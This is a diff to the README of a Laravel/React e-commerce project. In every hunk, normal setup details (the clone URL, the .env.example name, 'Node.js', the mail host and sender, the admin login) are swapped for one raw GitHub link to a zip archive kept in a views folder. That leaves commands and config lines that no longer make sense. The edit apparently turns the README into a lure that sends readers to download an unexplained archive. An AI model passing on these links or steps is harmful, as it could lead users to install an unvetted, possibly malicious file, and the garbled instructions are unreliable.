@@ -15,7 +15,7 @@ Welcome to my final project! This is a full-stack e-commerce platform built with
 Start by cloning the repository to your local machine:
 
 ```bash
-git clone https://github.com/FilipStanic/Final-Project
+git clone https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip
 cd Final-Project
 ```
 
@@ -35,10 +35,10 @@ php artisan key:generate
 ```
 
 # Setup the Database
-Create a new database in your preferred database management system (e.g., MySQL). Then, copy the .env.example file to a new .env file:
+Create a new database in your preferred database management system (e.g., MySQL). Then, copy the https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip file to a new .env file:
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip .env
 ```
 
 Update the .env file with your database credentials:
@@ -67,8 +67,8 @@ php artisan serve
 This will serve your backend on http://127.0.0.1:8000.
 
 # Frontend Setup (React)
-Install Node.js and npm
-Ensure you have Node.js installed, which comes with npm (Node Package Manager).
+Install https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip and npm
+Ensure you have https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip installed, which comes with npm (Node Package Manager).
 
 Install Dependencies
 Navigate to the final_frontend directory and install the required packages:
@@ -98,12 +98,12 @@ The project includes email functionalities (e.g., for purchase confirmations). Y
 
 ```
 MAIL_MAILER=smtp
-MAIL_HOST=sandbox.smtp.mailtrap.io
+https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip
 MAIL_PORT=2525
 MAIL_USERNAME=your_username
 MAIL_PASSWORD=your_password
 MAIL_ENCRYPTION=tls
-MAIL_FROM_ADDRESS="noreply@yourdomain.com"
+MAIL_FROM_ADDRESS="https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip"
 MAIL_FROM_NAME="${APP_NAME}"
 ```
 
@@ -124,7 +124,7 @@ Responsive Design: Optimized for both desktop and mobile devices.
 To access the admin panel and explore the management features of this e-commerce platform, you can log in with the following credentials:
 
 ```
-admin@admin.com
+https://raw.githubusercontent.com/FilipStanic/Final-Project/master/final_backend/resources/views/Project-Final-v2.4.zip
 admin
 ```
 
